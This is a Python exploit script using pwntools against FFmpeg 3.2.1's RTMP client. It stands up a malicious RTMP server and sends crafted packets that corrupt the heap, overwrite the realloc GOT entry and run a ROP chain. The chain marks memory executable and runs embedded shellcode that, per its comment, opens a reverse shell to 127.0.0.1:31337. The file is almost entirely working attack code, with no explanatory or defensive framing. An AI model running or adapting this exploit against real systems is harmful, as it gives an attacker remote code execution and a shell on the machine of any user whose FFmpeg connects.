#!/usr/bin/python

import os
import socket
import struct
from time import sleep

from pwn import *

bind_ip = '0.0.0.0'
bind_port = 12345

elf = ELF('ffmpeg-3.2.1/ffmpeg')

gadget = lambda x: next(elf.search(asm(x, 
    arch = 'amd64', os = 'linux')))


# Gadgets that we need to know inside binary 
# to successfully exploit it remotely
mov_rsp_rbx = 0x0000000000c79f31 #mov rsp, rbx; pop rbx; vzeroupper; ret;
pop_rdi = gadget('pop rdi; ret')
pop_rsi = gadget('pop rsi; ret')
pop_rdx = gadget('pop rdx; ret')
pop_rax = gadget('pop rax; ret')
mov_gadget = 0x0000000000602677 #0x0000000000602677: mov qword ptr [rax], rdx; xor eax, eax; ret; 


got_realloc = elf.got['realloc']
plt_mprotect = elf.plt['mprotect']

shellcode_location = 0x400000
# backconnect 127.0.0.1:31337 x86_64 shellcode
shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x7f\x00\x00\x01\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";

shellcode = '\x90' * (8 - (len(shellcode) % 8)) + shellcode

def create_payload(size, data, channel_id):
    payload = ''
    payload += p8((1 << 6) + channel_id) # (hdr << 6) & channel_id; 
    payload += '\0\0\0' # ts_field
    payload += p24(size) # size
    payload += p8(0x00) # type
    
    payload += data # data
    return payload

def create_rtmp_packet(channel_id, write_location, size=0x4141):
    data = ''
    data += p32(channel_id) # channel_id
    data += p32(0) # type
    data += p32(0) # timestamp
    data += p32(0) # ts_field
    data += p64(0) # extra

    data += p64(write_location) # write_location - data 

    data += p32(size) # size
    data += p32(0) # offset
    data += p64(0x180) # read
    return data

def p24(data):
    packed_data = p32(data, endian='big')[1:]
    assert(len(packed_data) == 3)
    return packed_data


def handle_request(client_socket):
    v = client_socket.recv(1)
    client_socket.send(p8(3))

    payload = ''
    payload += '\x00' * 4
    payload += '\x00' * 4
    payload += os.urandom(1536 - 8)
    client_socket.send(payload)
    client_socket.send(payload)

    client_socket.recv(0x600)
    client_socket.recv(0x600)

    print 'sending payload'
    # raw_input('1')
    payload = create_payload(0xa0, 'U' * 0x80, 4)
    client_socket.send(payload)
    # raw_input('2')
    payload = create_payload(0xa0, 'A' * 0x80, 20)
    client_socket.send(payload)

    data = ''
    data += 'U' * 0x20 # the rest of chunk
    data += p64(0)     # zerobytes 
    data += p64(0x6d1) # real size of chunk
    data += 'Y' * 0x30 # channel_zero
    data += 'Y' * 0x20 # channel_one
    # raw_input('3')
    payload = create_payload(0x2000, data, 4)
    client_socket.send(payload)

    data = ''
    data += 'I' * 0x10 # fill the previous RTMPPacket[1]
    # data += p64(add_rsp_a0) # one more trampoline

    data += create_rtmp_packet(2, got_realloc)
    data += 'A' * (0x80 - len(data)-8)
    # data += 'X'*8
    data += p64(0x00000000011e6fdb) #0x00000000011e6fdb: add rsp, 0x30; ret; 

    payload = create_payload(0x2000, data, 4)
    client_socket.send(payload)

    jmp_to_rop = ''
    jmp_to_rop += p64(mov_rsp_rbx)
    jmp_to_rop += 'A' * (0x80 - len(jmp_to_rop))
    payload = create_payload(0x2000, jmp_to_rop, 2)
    client_socket.send(payload)

    rop = ''
    rop += 'BBBBBBBB' * 6 # padding

    rop += p64(pop_rdi)
    rop += p64(shellcode_location)
    rop += p64(pop_rsi)
    rop += p64(0x1000)
    rop += p64(pop_rdx)
    rop += p64(7)
    rop += p64(plt_mprotect)

    write_location = shellcode_location
    shellslices = map(''.join, zip(*[iter(shellcode)]*8))
    
    for shell in shellslices:
        rop += p64(pop_rax)
        rop += p64(write_location)
        rop += p64(pop_rdx)
        rop += shell
        rop += p64(mov_gadget)

        write_location += 8
    
    rop += p64(shellcode_location)
    rop += 'X' * (0x80 - (len(rop) % 0x80))

    rop_slices = map(''.join, zip(*[iter(rop)]*0x80))
    for data in rop_slices:
        payload = create_payload(0x2000, data, 4)
        client_socket.send(payload)

    # does not matter what data to send because we try to trigger
    # av_realloc function inside ff_rtmp_check_alloc_array
    # so that av_realloc(our_data) shall be called
    payload = create_payload(1, 'A', 63)
    client_socket.send(payload)

    sleep(3)
    print 'sending done'
    client_socket.close()

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.bind((bind_ip, bind_port))
    s.listen(5)

    while True:
        print 'Waiting for new client...'
        client_socket, addr = s.accept()
        handle_request(client_socket)